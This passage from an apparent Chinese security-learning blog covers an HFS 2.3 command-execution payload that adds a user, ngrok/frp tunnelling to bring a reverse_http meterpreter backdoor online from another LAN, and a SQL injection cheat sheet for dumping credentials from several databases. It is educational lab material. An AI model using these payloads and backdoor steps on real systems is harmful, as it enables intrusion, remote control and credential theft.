<p>下载：<a href="http://www.winwin7.com/soft/12112.html#xiazai">HFS2.3下载</a></p>
<p>4、攻击payload及过程：</p>
<p>4.1 Payload：<a href="http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}</p>
<p>4.2攻击过程实例：</p>
<p><a href="http://127.0.0.1:81/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:81/?search==%00{.exec|cmd.exe</a> &#x2F;c net user test1234 1234 &#x2F;add.}</p>
<p>在本地执行</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559370177.png" alt="1653559370177"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[基础阶段]</title>
    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[代理技术]</title>
    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D/</url>
    <content><![CDATA[<p><img src="/../../images/xdnwaq/1651925898412.png" alt="1651925898412"></p>
<blockquote>
<p>代理技术和隧道技术都属于内网穿透，代理主要解决内网里面通信的问题（比如对方在内网，你也在内网，这时候两个内网实现通信就必须要经过代理才能实现，常见工具有frp、ngrok和ew等，ew（earthworm已经停止更新了，就不演示）），和一些防火墙的拦截<br>隧道主要是一些安全设备和流量监控设备上的拦截问题</p>
</blockquote>
<h2><span id="必要基础知识点">必要基础知识点：</span></h2><h2><span id="1内外网简单知识">1.内外网简单知识</span></h2><blockquote>
<p><strong>内网ip地址是私有ip地址（<em>10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16</em>），除此之外就是公有ip</strong></p>
</blockquote>
<h2><span id="2内网1和内网2通信问题">2.内网1和内网2通信问题</span></h2><blockquote>
<p><strong>1主机在内网1,2主机在内网2.就好比说你在学校宿舍上网，我在网吧上网，我们都属于内网，但是我们不是一个内网，您是学校内网，我是网吧内网，这两个网络如果要实现通信。比如我现在有个后门CS或者MSF生成一个后门发给你，你去执行这个后门，这个时候如果你能让对方上线到你这是上线不了的，因为你们都是内网，除非这个时候采用一些代理技术。你用CS想控制这台内网主机，你CS在另外一个内网，受害主机在一个内网，那么上线是不可能的。必须要借助代理</strong></p>
</blockquote>
<h2><span id="3正反向协议通信连接问题">3.正反向协议通信连接问题</span></h2><blockquote>
<p><strong>正向代理就是正方向的连接，反向代理就是反方向的连接</strong><br><strong>什么是正方向，什么是反方向呢？</strong><br><strong>如果是控制端去连接被控制端的话，就属于正向代理，</strong><br><strong>被控制端去连接控制端就是反向代理。</strong></p>
<p><strong>这个正向代理和反向代理为什么要区分开呢？</strong><br><strong>你的控制端如果是服务器，是外网一台主机，就是公网的一台服务器，就相当于你在外网有一个唯一的IP地址，通过这个IP地址你能够找到你；</strong><br><strong>被控制的肉鸡是内网，如果你去主动找这台被控的内网主机你是找不到的，</strong></p>
</blockquote>
<p><img src="/../../images/xdnwaq/1651926501330.png" alt="1651926501330"></p>
<h2><span id="4内网穿透代理隧道技术说明">4.内网穿透代理隧道技术说明</span></h2><blockquote>
<p><strong>隧道主要解决流量分析工具和流量监控工具 还有想防火墙过滤问题</strong><br><strong>代理主要解决网络的连通性问题</strong></p>
</blockquote>
<p><img src="/../../images/xdnwaq/1651926587727.png" alt="1651926587727"></p>
<blockquote>
<p>黑客在湖南局域网，肉鸡在上海局域网，你用的是自己内网里面的虚拟机kali生成的后门，你想实现控制上海的肉鸡。<br>理论上，如果你不涉及到代理，是绝对控制不了的，因为你两者都是内网，你生成后门的时候，你如果写你外网的木马地址的话，它去连接的时候找到的是你的路由器，你写你内网地址的话，那就更加找不到，它就不可能实现控制。</p>
</blockquote>
<blockquote>
<p><strong>这时候就要借助ngrok这款工具来实现连通，它是怎么实现呢？下面简单把原理分析一下</strong></p>
<p>​        用到ngrok这款工具的时候，ngrok会在外网启动一台服务器给你，相当于这台肉鸡想去找你的时候先去找这个服务器，服务器再传输给你。同样，如果你要找这台肉鸡，也要经过这台服务器，其实就是说，这款工具就是在中间架设一台外网服务器，因为这台外网服务器你和他都能访问，你找对面肉鸡的时候会经过外网服务器，这个数据要回连给控制端的时候也会找这台外网服务器，服务器会在控制端这里有个客户端，就相当于接收服务器给的数据，你出去，客户端给服务器；数据连通就是正常的！其实就是找了一个中介！</p>
</blockquote>
<h1><span id="演示案例">演示案例</span></h1><h2><span id="内网穿透ngrok测试演示-两个内网通讯上线">内网穿透Ngrok测试演示-两个内网通讯上线</span></h2><p> <strong>实验环境：</strong>两个不同的内网(有网络)实现穿透控制<br><strong>1.注册-购买-填写-确认<a href="http://www.ngrok.cc/%EF%BC%88%E5%9B%BD%E5%86%85%EF%BC%89">http://www.ngrok.cc/（国内）</a></strong><br>协议：http 本地端口：192.168.76.132:4444 </p>
<h3><span id="开通隧道">开通隧道</span></h3><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D.assets/1651927061288.png" alt="1651927061288"></p>
<p><img src="/../../images/xdnwaq/1651927275953.png" alt="1651927275953"></p>
<h3><span id="kali搭建隧道">Kali搭建隧道</span></h3><p> <strong>192.168.176.137:4444就是本机kali的ip地址</strong> </p>
<p>Kali搭建sunny环境</p>
<p><img src="/../../images/xdnwaq/1640708930372.png" alt="1640708930372"></p>
<p><img src="/../../images/xdnwaq/1640709074892.png" alt="1640709074892"></p>
<h3><span id="kali生成后门">Kali生成后门</span></h3><p>lhost主机地址是隧道地址，也就是说肉鸡执行木马之后会找到公网上的隧道地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_http lhost=junzi.free.idcfengye.com【购买隧道的域名】 lport=80 -f exe -o test.exe  <br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1651985725753.png" alt="1651985725753"></p>
<h3><span id="msf配置后门监听状态">MSF配置后门监听状态</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_http<br>set lhost 192.168.76.132<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1640710640214.png" alt="1640710640214"></p>
<h3><span id="肉鸡上线">肉鸡上线</span></h3><p>win7运行后门后，成功监听到</p>
<p><img src="/../../images/xdnwaq/1640712114675.png" alt="1640712114675"></p>
<h3><span id="原理刨析">原理刨析</span></h3><p>Kali和win7是在不同的局域网中，但是都能上网，普通的msf后门肯定是 不能让 win7上线成功的，但是借助一个外网服务器充当代理，那么就可以实现控制win7的目的</p>
<p><img src="/../../images/xdnwaq/1640712970874.png" alt="1640712970874"></p>
<h2><span id="案例2-内网穿透frp自建跳板测试-两个内网通讯上线">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</span></h2><p><a href="https://github.com/fatedier/frp/releases">Frp Github下载</a></p>
<p> <strong>优点：自行搭建，方便修改，成本低，使用多样化</strong></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[SQL注入]</title>
    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSQL%E6%B3%A8%E5%85%A5%5D/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1><span id="一sql注入">一：SQL注入</span></h1><blockquote>
<p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。 </p>
</blockquote>
<blockquote>
<p><img src="/../../images/xdsql/1650258465529.png" alt="1650258465529"></p>
</blockquote>
<h2><span id="1-sql注入的分类">1.  SQL注入的分类</span></h2><p><strong>从注入手法分类可以分为：</strong></p>
<blockquote>
<p><strong>联合查询注入</strong></p>
<p><strong>报错型注入</strong></p>
<p><strong>布尔型注入</strong></p>
<p><strong>延时注入</strong></p>
<p><strong>堆叠注入</strong></p>
<p><strong>Cookie注入</strong></p>
<p><strong>HTTP头注入</strong></p>
<p><strong>JSON注入</strong></p>
<p><strong>POST注入</strong></p>
<p><strong>二次注入</strong></p>
<p><strong>DNS注入</strong></p>
<p><strong>宽字节注入</strong></p>
<p><strong>……</strong></p>
</blockquote>
<p><strong>从数据类型上可以分为：</strong></p>
<blockquote>
<p><strong>字符型（即输入的输入使用符号进行过滤）</strong></p>
<p><strong>数值型（即输入的输入未使用符号进行过滤）</strong></p>
</blockquote>
<p><strong>从注入位置可以分类为：</strong></p>
<blockquote>
<p><strong>GET数据（提交数据方式为GET，大多存在地址栏）</strong></p>
<p><strong>POST数据（提交数据方式为POST，大多存在输入框中）</strong></p>
<p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
<p><strong>cookie数据（提交数据方式为cookie）</strong></p>
</blockquote>
<h2><span id="12-判断注入点">1.2 判断注入点</span></h2><blockquote>
<p>and 1&#x3D;1 页面正常<br>and 1&#x3D;2 页面错误</p>
<p> <strong>可能存在注入，其实归根结底就是看我们的输入会不会对网站造成影响，即我们的操作有效</strong> </p>
<p>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1 错误</p>
<p>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;2 LIMIT 0,1 正常</p>
</blockquote>
<h2><span id="13-判断字段数"><strong>1.3 判断字段数</strong></span></h2><p>order by 1,2,3,4</p>
<h2><span id="14-常见的sql数据库函数">1.4 常见的SQL数据库函数</span></h2><blockquote>
<ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名</li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
</blockquote>
<h2><span id="15-判断sql数据库类型">1.5 判断SQL数据库类型</span></h2><blockquote>
<p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
<p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
<p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
<p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
<p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
</blockquote>
<h1><span id="二注入时信息收集">二：注入时信息收集</span></h1><p><img src="/../../images/xdsql/1650259113342.png" alt="1650259113342"></p>
<h3><span id="1-信息收集">1.  信息收集：</span></h3><blockquote>
<ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名</li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
</blockquote>
<h3><span id="12-数据库注入">1.2 数据库注入：</span></h3><p> 在mysql5.0以上版本存在一个 <code>information_schema</code>的数据库，它记录着所有的数据库，表名，列名。 </p>
<p><img src="/../../images/xdsql/1650259264511.png" alt="1650259264511"></p>
<ul>
<li>数据库中“.”代表下级</li>
<li><code>select * information_schema.tables;</code>记录所有表名</li>
<li><code>where table_name=&#39;&#39;</code>筛选条件</li>
<li><code>select * from information_schema.columns;</code>记录所有的列名</li>
<li><code>where column_name=&#39;&#39;</code>筛选条件</li>
<li><code>wherw table_schema=&#39;&#39;</code>筛选条件</li>
</ul>
<blockquote>
<ol>
<li>获取所有数据库名</li>
</ol>
<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’pikachu’</p>
<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<p>union select 1,group_concat(column_name),3 from information_schema.columns where  table_name&#x3D;’users’ and table_schema&#x3D;’pikachu’</p>
<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<p>union select 1,username,password from users  LIMIT 1,1 –+</p>
</blockquote>
<h2><span id="13-information_schema-注入"><strong>1.3 information_schema 注入</strong></span></h2><h1><span id="三类型及提交注入">三：类型及提交注入</span></h1><blockquote>
<p> 在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入</p>
</blockquote>
<h3><span id="1-简要明确参数类型"><strong>1. 简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
<p><strong>数字，字符，搜索，JSON 等</strong></p>
<h3><span id="12数字x2f字符"><strong>1.2数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
<p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
<p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
<blockquote>
<p>select * from user where id &#x3D;1;</p>
<p>select * from user where name&#x3D;’xiaojun’;</p>
</blockquote>
<blockquote>
<p><img src="/../../images/xdsql/8.png" alt="8"></p>
</blockquote>
<p>$name&#x3D;$_GET[‘x’];</p>
<p>$sql&#x3D;<strong>“<strong>select * from user where name&#x3D;’$name’</strong>“;</strong></p>
<p>这样的话，注入语句就被写到单引号中了，那么这条语句就没有作用了</p>
<p>?x&#x3D;xiaojun and 1&#x3D;1</p>
<p>select * from user where name&#x3D;’xiaojun and 1&#x3D;1’</p>
<p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
<p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
<p><img src="/../../images/xdsql/9.png" alt="9"></p>
<h3><span id="13-搜索"><strong>1.3 搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
<p>select * from user where name like ‘%xiaojun%’ </p>
<h3><span id="14-简要明确请求方法"><strong>1.4 简要明确请求方法</strong></span></h3><ul>
<li><p><strong>GET,POST,COOKIE,REQUEST,HTTP 头等</strong></p>
</li>
<li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
</li>
</ul>
<p><img src="/../../images/xdsql/10.png" alt="10"></p>
<ul>
<li><strong>一般情况下，大数据采用POST上传方式</strong></li>
</ul>
<p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
<blockquote>
<p>GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>           GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</p>
</blockquote>
<h3><span id="15-get和post两种基本请求方法和区别">1.5 GET和POST两种基本请求方法和区别：</span></h3><p><a href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
<h3><span id="16-干扰符号">1.6 干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
<p>Less-1为例：</p>
<ol>
<li><p><a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
<p>报错语句： SELECT * FROM users WHERE id&#x3D;’1’  and 1&#x3D;1’ LIMIT 0,1 </p>
<p><img src="/../../images/xdsql/11.png" alt="11"></p>
</li>
<li><p>正确的SQL语句：<a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and ‘1’&#x3D;’1</p>
</li>
</ol>
<p><img src="/../../images/xdsql/12.png" alt="12"></p>
<ol start="3">
<li>当然，这种方法显得麻烦，直接使用注释也可以起到同样的效果</li>
</ol>
<p>–+负责把后面的单引号注释掉</p>
<p><img src="/../../images/xdsql/13.png" alt="13"></p>
<h1><span id="四union注入">四：UNION注入</span></h1><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
<blockquote>
<ol>
<li><p><strong>利用order判断字段数</strong></p>
<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
<p>?id&#x3D;1’ order by 3–+</p>
</li>
<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
<p>?id&#x3D;-1 union select 1,2,3 –+</p>
</li>
<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
</li>
</ol>
</blockquote>
<h1><span id="五-information_schema注入">五： information_schema注入</span></h1><blockquote>
<ol>
<li><strong>获取所有数据库名</strong></li>
</ol>
<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’pikachu’</p>
<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<p>union select 1,group_concat(column_name),3 from information_schema.columns where  table_name&#x3D;’users’ and table_schema&#x3D;’pikachu’</p>
<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<p>union select 1,username,password from users  LIMIT 1,1 –+</p>
</blockquote>
<h1><span id="六-常见数据库注入方法">六 常见数据库注入方法</span></h1><h3><span id="1-mysql注入">1. Mysql注入</span></h3><blockquote>
<p><strong>1.找到注入点 and 1&#x3D;1 and 1&#x3D;2 测试报错</strong></p>
</blockquote>
<blockquote>
<p>2.order by 5 # 到5的时候报错，获取字段总数为4</p>
</blockquote>
<blockquote>
<p>3.id&#x3D;0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息</p>
</blockquote>
<blockquote>
<p>4.获取数据库信息</p>
<p>user() &#x3D;&#x3D;&gt;root</p>
<p>database() &#x3D;&#x3D;&gt;mozhe_Discuz_StormGroup</p>
<p>version() &#x3D;&#x3D;&gt;5.7.22-0ubuntu0.16.04.1</p>
</blockquote>
<blockquote>
<p>5.获取数据库表</p>
<p>table_name 表名</p>
<p>information_schema.tables 系统生成信息表</p>
<p>table_schema&#x3D;数据库名16进制或者用单引号括起来</p>
<p>改变limit 0，1中前一个参数，得到两个表 StormGroup_member notice</p>
</blockquote>
<blockquote>
<p>6.获取列名</p>
</blockquote>
<blockquote>
<p>结果如下 id,name,password,status</p>
</blockquote>
<blockquote>
<p>7.脱裤</p>
</blockquote>
<h3><span id="2access注入">2.ACCESS注入</span></h3><p><img src="/../../images/xdsql/1650295362245.png" alt="1650295362245"></p>
<blockquote>
<p>1.and 1&#x3D;2 报错找到注入点</p>
<p>2.order by 获取总字段</p>
<p>3.猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p>
<p>4.猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p>
<p>5.脱裤 union select 1,username,passwd,4 from admin</p>
</blockquote>
<h3><span id="3-sql-server">3. Sql Server</span></h3><h2><span id="sql-serverx2fmssql注入">SQL server&#x2F;MSSQL注入</span></h2><ol>
<li>介绍</li>
</ol>
<p>Microsoft SQL Server 是一个全面的数据库平台，使用集成的商业智能 (BI)工具提供了企业级的数据管理。Microsoft  SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能，使您可以构建和管理用于业务的高可用和高性能的数据应用程序。</p>
<ol>
<li>过程</li>
</ol>
<p><strong>①</strong>判断数据库类型</p>
<p>and exists (select * from sysobjects)–返回正常为mssql（也名sql server）</p>
<p>and exists (select count(*) from sysobjects)–有时上面那个语句不行就试试这个哈</p>
<p><strong>②</strong>判断数据库版本</p>
<p>​    and 1&#x3D;@@version–这个语句要在有回显的模式下才可以哦</p>
<p>​    and substring((select  @@version),22,4)&#x3D;’2008’–适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）</p>
<p><strong>③</strong>获取所有数据库的个数 (一下3条语句可供选择使用)  </p>
<p>\1. and 1&#x3D;(select quotename(count(name)) from master..sysdatabases)–</p>
<p>\2. and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) –</p>
<p>\3. and 1&#x3D;(select str(count(name))%2b’|’ from master..sysdatabases where dbid&gt;5) –</p>
<p>​     and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) –</p>
<p>说明：dbid从1-4的数据库一般为系统数据库.</p>
<p><strong>⑤</strong>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;&#x3D;2005，两条语句可供选择使用）  </p>
<p>​    and 1&#x3D;(select quotename(name) from master..sysdatabases FOR XML PATH(‘’))–</p>
<p>​    and 1&#x3D;(select ‘|’%2bname%2b’|’ from master..sysdatabases FOR XML PATH(‘’))–</p>
<p><strong>⑥</strong>获取当前数据库 </p>
<p>and db_name()&gt;0</p>
<p>and 1&#x3D;(select db_name())–</p>
<p><strong>⑦</strong>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】</p>
<p>​    and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))– </p>
<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’  FOR XML PATH(‘’))–</p>
<p><strong>⑧</strong>获得表里的列</p>
<p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p>
<p>​     and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))– </p>
<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p>
<p>⑨获取指定数据库中的表的列的数据库</p>
<p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：</p>
<p>​    and 1&#x3D;(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(‘’))–</p>
<p>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：</p>
<p>​     and 1&#x3D;(select top N * from 指定数据库..指定表名 FOR XML PATH(‘’))–复制代码第一条语句：and  1&#x3D;(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(‘’))–测试效果图：———————————-加上where条件筛选结果出来会更加好，如：where  and name like ‘%user%’ 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</p>
<p>转自：<a href="http://www.myhack58.com/Article/html/3/8/2015/63146.htm">http://www.myhack58.com/Article/html/3/8/2015/63146.htm</a></p>
<h3><span id="4-oracle数据库">4. Oracle数据库</span></h3><p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
<h3><span id="5-mongodb">5. MongoDB</span></h3><blockquote>
<p>1.id&#x3D;1′ 单引号注入报错</p>
<p>2.闭合语句，查看所有集合</p>
<p>3.查看指定集合的数据</p>
<p>[0] 代表第一条数据，可递增</p>
</blockquote>
<h3><span id="6-db2">6. DB2</span></h3><blockquote>
<p>1.and 1&#x3D;2 判断注入点</p>
<p>2.order by N 获取字段数</p>
<p>3.爆当前数据库</p>
<p>GAME_CHARACTER</p>
<p>4.列表</p>
<p>NAME</p>
<p>5.脱裤</p>
</blockquote>
<h3><span id="7-sqlite">7. SQLite：</span></h3><blockquote>
<p>1.找注入点 and 1&#x3D;1</p>
<p>2.order by N 猜字段 4</p>
<p>3.猜数据库</p>
<p>offset &#x3D;&#x3D;&gt;0~2</p>
<p>有三个数据库：</p>
<p>WSTMart_reg</p>
<p>notice_sybase</p>
<p>sqlite_sequence</p>
<p>4.猜列</p>
<p>共有3个字段：</p>
<p>id,name,password</p>
<p>5.脱裤</p>
</blockquote>
<h3><span id="8-postgrasql注入原理">8. PostgraSQL注入原理</span></h3><p><a href="https://www.webshell.cc/524.html">https://www.webshell.cc/524.html</a></p>
<p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
<p><a href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a></p>
<h1><span id="七注入工具">七：注入工具</span></h1><h3><span id="11-sqlmap">1.1 SQLmap</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
<p><img src="/../../images/xdsql/14.png" alt="14"></p>
<h1><span id="八盲注">八：盲注</span></h1><p>​    当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
<p><strong>涉及知识点：</strong></p>
<ul>
<li><p><strong>报错盲注</strong></p>
</li>
<li><p><strong>延迟盲注</strong></p>
</li>
<li><p><strong>布尔盲注</strong></p>
</li>
</ul>
<p><strong>ASCCI码表</strong></p>
<p><img src="/../../images/xdsql/ascci.png" alt="1646537964629"></p>
<h3><span id="1-报错盲注">1. 报错盲注</span></h3><p>​    <strong>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</strong></p>
<p>分享一个讲的不错的视频：</p>
<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338198345&page=17" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
重点理解:
我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的SQL查询方式 

<p><strong>SQL语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sqlite">select 查询数据<br>在网站应用中进行数据显示查询效果<br>例： select * from news wher id=$id<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mssql">insert 插入数据<br><br>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> 删除数据<br><br>后台管理里面删除文章删除用户等操作<br>例：<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>

